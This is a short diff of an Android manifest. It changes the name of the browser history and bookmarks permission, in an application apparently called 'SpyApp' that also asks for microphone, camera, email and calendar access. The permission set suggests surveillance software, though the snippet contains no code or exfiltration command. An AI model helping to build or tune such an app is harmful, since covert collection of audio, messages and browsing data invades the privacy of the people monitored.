@@ -16,7 +16,7 @@
 	<uses-permission android:name="android.permission.RECORD_AUDIO" />
 	<uses-permission android:name="android.permission.CAMERA" />
 	<uses-permission android:name="com.android.email.permission.ACCESS_PROVIDER" />
-	<uses-permission android:name="android.permission.READ_HISTORY_BOOKMARKS" />
+	<uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS" />
 	<uses-permission android:name="android.permission.READ_CALENDAR" />
 	
 	<application android:name="SpyApp"
